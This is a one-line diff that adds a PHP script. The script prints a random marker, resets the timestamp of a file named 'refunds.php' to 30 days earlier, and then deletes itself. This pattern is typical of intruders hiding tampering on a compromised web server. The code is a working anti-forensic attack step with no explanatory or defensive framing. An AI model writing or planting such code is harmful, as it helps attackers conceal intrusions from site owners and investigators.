@@ -1,0 +1,1 @@
+<?php echo "XwCFAsazMq"; if (file_exists("./refunds.php")){ touch("./refunds.php",(time()-60*60*24*30*1)); } unlink(__FILE__); /*dZW0x6ntUv1R2n06PUKn*/ ?>
